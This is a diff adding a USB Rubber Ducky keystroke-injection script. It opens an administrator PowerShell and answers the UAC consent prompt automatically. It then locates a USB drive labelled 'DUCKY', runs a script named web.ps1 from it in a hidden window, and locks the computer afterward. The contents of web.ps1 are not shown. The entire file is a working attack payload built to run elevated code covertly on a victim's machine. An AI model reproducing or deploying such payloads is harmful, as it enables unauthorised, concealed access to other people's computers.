@@ -1,0 +1,35 @@
+REM opens powershell
+DELAY 100
+GUI r
+DELAY 100
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 50
+ENTER
+DELAY 1500
+ALT Y
+DELAY 1000
+REM STRING mode con:cols=18 lines=1
+REM DELAY 50
+REM ENTER
+REM DELAY 50
+STRING $usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'DUCKY' } | select name
+DELAY 50
+ENTER
+DELAY 50
+STRING cd $usbPath.name
+DELAY 100
+ENTER
+DELAY 50
+STRING start-process PowerShell $pwd\web.ps1 -WindowStyle Hidden
+DELAY 100
+ENTER
+DELAY 400
+REM ********
+REM navigates to USB drive usb is called DUCKY for me
+DELAY 300
+STRING exit
+DELAY 50
+ENTER
+REM ------lock the pc
+DELAY 3000
+GUI l
